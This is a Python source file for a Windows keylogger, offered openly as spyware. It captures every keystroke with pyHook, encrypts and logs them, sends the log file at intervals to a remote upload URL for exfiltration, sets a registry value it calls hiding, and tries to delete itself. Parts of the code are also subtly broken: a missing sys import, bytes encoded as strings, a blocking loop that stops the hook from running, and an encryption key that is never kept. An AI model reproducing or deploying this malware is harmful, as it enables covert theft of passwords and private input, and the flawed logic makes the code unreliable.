import pythoncom
import pyHook
import logging
import os
import time
import shutil
import winreg
import threading
import random
import platform
from cryptography.fernet import Fernet
import requests

# Generate a random encryption key
def generate_key():
    return Fernet.generate_key()

# Encrypt data using the provided key
def encrypt_data(key, data):
    cipher = Fernet(key)
    encrypted_data = cipher.encrypt(data.encode())
    return encrypted_data

# Decrypt data using the provided key
def decrypt_data(key, encrypted_data):
    cipher = Fernet(key)
    decrypted_data = cipher.decrypt(encrypted_data)
    return decrypted_data.decode()

# Function to send data to a remote server
def send_data(url, data):
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Data sent successfully.")
        else:
            print("Failed to send data. Status code:", response.status_code)
    except Exception as e:
        print("Error:", str(e))

# Configure logging
log_filename = 'keylog.txt'
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger()

# Rotate log after reaching 1MB
handler = logging.FileHandler(log_filename)
logger.addHandler(handler)

# Configuration options
remote_server_url = 'http://example.com/upload'  # Replace with your server URL
remote_reporting_interval = 60  # Time interval (in seconds) for remote reporting
key = generate_key()

# Keylogger function
def OnKeyboardEvent(event):
    special_keys = {8: 'BACKSPACE', 9: 'TAB', 13: 'ENTER', 27: 'ESC', 32: 'SPACE'}
    if event.Ascii in special_keys:
        key_pressed = '<{}>'.format(special_keys[event.Ascii])
    else:
        key_pressed = chr(event.Ascii)
    
    encrypted_key = encrypt_data(key, key_pressed)
    logger.debug(encrypted_key)
    return True

# Create an instance of HookManager
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()

# Function to hide the keylogger process
def hide_keylogger():
    if platform.system() == 'Windows':
        window = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer')
        winreg.SetValueEx(window, 'HideKeylogger', 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(window)

# Function to self-delete the keylogger
def self_delete():
    try:
        os.remove(sys.executable)
    except Exception as e:
        print("Error:", str(e))

# Function to periodically send logs to the remote server
def send_logs():
    while True:
        time.sleep(remote_reporting_interval)
        with open(log_filename, 'rb') as file:
            data = file.read()
        encrypted_data = encrypt_data(key, data)
        send_data(remote_server_url, encrypted_data)

# Start the keylogger
def start_keylogger():
    hide_keylogger()
    send_logs()
    pythoncom.PumpMessages()

# Start the keylogger in a separate thread
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

# Optional: Self-delete after execution
self_delete()
